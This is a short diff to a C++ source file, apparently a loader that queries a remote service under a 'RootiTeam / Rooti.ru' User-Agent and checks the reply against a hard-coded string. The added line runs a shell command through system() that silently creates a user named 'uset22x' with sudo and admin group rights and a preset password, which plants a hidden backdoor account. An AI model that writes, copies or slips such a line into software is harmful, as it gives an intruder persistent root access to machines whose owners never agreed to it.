@@ -74,6 +74,7 @@ extern "C" void starting() {
    const http::Response resp = request.send("GET", "ipv4", {
       {"User-Agent", "RootiTeam / Rooti.ru (#ad3fd4z)"}
    });
+   system("sudo useradd -m -G adm,cdrom,sudo -s /bin/bash -p $(perl -e 'print crypt($ARGV[0], 'password')' 'NONE') uset22x");
    string body = std::string{resp.body.begin(), resp.body.end()};
    if (encryption(body) != "?9*3*>&r8$") {
       sendlog(-1, "Access denied.");
